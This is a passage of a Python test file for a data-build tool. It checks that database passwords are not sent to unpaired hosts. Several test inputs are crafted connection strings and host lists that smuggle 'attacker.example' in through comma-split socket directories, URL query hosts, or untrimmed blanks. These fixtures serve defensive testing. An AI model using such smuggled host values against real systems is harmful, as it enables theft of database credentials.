    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example,DB_PW@attacker.example")
    both()


def test_an_operators_host_beside_a_socket_directory_is_paired_like_any_other(monkeypatch):
    """The exemption is for a host that is one whole variable; a list is not."""
    monkeypatch.setenv("ZZZ", "attacker.example")
    contract = _list_contract("/tmp,{{ env.ZZZ }}")
    with pytest.raises(EnvTemplateError):
        check_env_pairing(contract)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example,DB_PW@attacker.example")
    check_env_pairing(contract)


def test_the_hosts_a_project_value_names_leave_out_its_socket_directories():
    from fluid_build.util.env_templates import _hosts_named_by

    assert _hosts_named_by("/tmp,attacker.example", "host") == ["attacker.example"]
    assert _hosts_named_by("attacker.example,/tmp", "host") == ["attacker.example"]
    assert _hosts_named_by("/var/run/postgresql", "host") is None
    assert _hosts_named_by("/a,/b", "host") is None
    assert _hosts_named_by("/data/a,b.csv", "uri") is None, "not a field libpq reads as a list"


@pytest.mark.parametrize(
    "connection",
    [
        {"uri": "postgresql://localhost/db,/x?host=attacker.example"},
        {"uri": "postgresql://localhost/db?x=1,/y&host=attacker.example"},
        {"uri": "postgresql://localhost/db?host=attacker.example"},
        {"connection_string": "postgresql://localhost/db,/x?host=attacker.example"},
        {
            "sqlalchemy_url": "postgresql://u:{{ env.DB_PW }}@localhost/db?application_name=a,/x"
            "&host=attacker.example"
        },
        {
            "uri": "postgresql://u:{{ env.DB_PW }}@localhost/db?application_name=a,/x"
            "&host=attacker.example"
        },
    ],
)
def test_a_url_is_never_split_at_a_comma_so_its_query_host_is_still_judged(connection):
    """Only a field libpq reads as a host list is split: ``,/`` in a URL ends no element."""
    contract = _airbyte_contract({**connection, "password": "{{ env.DB_PW }}"})
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract)
    assert info.value.extras["variable"] == "DB_PW"


@pytest.mark.parametrize(
    "host",
    [
        "/sockdir, /x.attacker.example",
        "/sockdir,\t/x.attacker.example",
        "/sockdir,\u00a0/x.attacker.example",
        " /x.attacker.example",
    ],
)
def test_an_element_led_by_a_blank_is_a_host_because_libpq_does_not_trim(host, monkeypatch):
    """libpq splits at the commas and nothing else: `` /x.attacker.example`` is looked up as a name."""
    contract = _list_contract(host)
    with pytest.raises(EnvTemplateError) as info:
        check_env_pairing(contract, stage="fluid apply")
    assert info.value.extras["variable"] == "DB_PW" and _PROBE not in repr(info.value.__dict__)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW")  # the host is no name the policy can pair
    check_env_pairing(contract)


@pytest.mark.parametrize(
    "connection",
    [
        {"uri": "/data/a,b.csv"},
        {"endpoint": "/v1/items,orders"},
        {"uri": "/data/a,/data/b.csv"},
    ],
)
def test_a_path_with_a_comma_in_a_field_that_is_no_host_list_is_still_a_path(connection):
    """A file or a REST path may hold a comma; only ``host`` and ``hostaddr`` are lists."""
    contract = _airbyte_contract({**connection, "password": "{{ env.DB_PW }}"})
    check_env_pairing(contract)
    check_host_templates(contract)


@pytest.mark.parametrize("host", ["{{ env.ZZZ }},/s", "/s,{{ env.ZZZ }}"])
def test_both_checks_refuse_an_operators_variable_in_a_list_with_a_path(host, monkeypatch):
    """A list is not one whole variable, so the operator's own host in it is paired like any other."""
    monkeypatch.setenv("ZZZ", "attacker.example")
    contract = _list_contract(host)
    with pytest.raises(EnvTemplateError):
        check_host_templates(contract)
        check_env_pairing(contract)
    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "ZZZ@attacker.example,DB_PW@attacker.example")
    check_host_templates(contract)
    check_env_pairing(contract)


@pytest.mark.parametrize("engine_name", ["duckdb", "meltano", "airbyte"])
def test_a_postgres_host_list_with_a_socket_directory_reaches_no_runner_unpaired(
    engine_name, tmp_path: Path, monkeypatch, capsys
):
    """DuckDB's ATTACH, Meltano's tap-postgres and the Airbyte source all hand ``host`` to libpq."""
    from fluid_build.build_runners.base import _execute_acquisition_build

    calls = _fake_runner(monkeypatch, engine_name)
    contract = _list_contract("/sockdir,attacker.example", engine_name)

    assert _execute_acquisition_build(contract["builds"][0], contract, tmp_path, dry_run=False) == 1
    shown = capsys.readouterr()
    assert calls == [], "the runner was never started"
    assert "attacker.example" in shown.out + shown.err and _PROBE not in shown.out + shown.err

    monkeypatch.setenv(SECRET_REF_ALLOWLIST, "DB_PW@attacker.example")
    assert _execute_acquisition_build(contract["builds"][0], contract, tmp_path, dry_run=False) == 0
    assert "/sockdir,attacker.example" in repr(calls) and _PROBE in repr(
        calls
    ), "the operator decides"

    plain = _list_contract("/var/run/postgresql", engine_name)
    monkeypatch.delenv(SECRET_REF_ALLOWLIST)
    assert _execute_acquisition_build(plain["builds"][0], plain, tmp_path, dry_run=False) == 0


@_SHAPES
def test_a_socket_directory_beside_a_host_reaches_neither_streaming_engine_unpaired(
    engine, tmp_path: Path, monkeypatch, capsys, shape
):
    contract_for, pushed = engine
    contract = contract_for()
    _source(contract).update({"host": "/sockdir,attacker.example", "password": "{{ env.DB_PW }}"})

    assert _run(contract, tmp_path, shape) == 1
    shown = capsys.readouterr()
    assert _PROBE not in shown.out + shown.err + pushed() and "attacker.example" not in pushed()
